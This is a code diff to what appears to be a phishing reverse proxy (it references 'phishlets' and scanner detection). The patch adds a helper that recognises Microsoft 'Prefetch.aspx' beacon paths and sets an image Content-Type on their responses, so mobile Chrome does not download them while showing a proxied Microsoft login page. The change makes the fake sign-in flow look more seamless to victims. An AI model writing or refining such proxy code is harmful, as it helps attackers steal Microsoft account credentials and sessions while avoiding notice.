@@ -1471,6 +1471,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// Microsoft's prefetch beacons 404 with nosniff and no Content-Type;
+			// mobile Chrome downloads them ("Prefetch.aspx"). Declare an inline
+			// image type so the browser renders the (empty) beacon instead.
+			if resp.Header.Get("Content-Type") == "" && resp.Request != nil && prefetchBeaconPath(resp.Request.URL.Path) {
+				resp.Header.Set("Content-Type", "image/gif")
+			}
+
 			mime := strings.Split(resp.Header.Get("Content-type"), ";")[0]
 			if err == nil {
 				for site, pl := range p.cfg.phishlets {
@@ -1993,6 +2000,15 @@ func (p *HttpProxy) isScannerRequest(ua, ip string) bool {
 		return true
 	}
 	return false
+}
+
+// prefetchBeaconPath reports whether a path is one of Microsoft's prefetch
+// beacons (the login page's CB-partner preload and the OWA auth probe). They
+// answer 404 with `X-Content-Type-Options: nosniff` and *no* Content-Type, and
+// mobile Chrome then treats the empty response as a file download
+// ("Prefetch.aspx"). Only the header needs fixing, not the phishlet.
+func prefetchBeaconPath(p string) bool {
+	return strings.Contains(strings.ToLower(p), "prefetch.aspx")
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, url string) (*http.Request, *http.Response) {
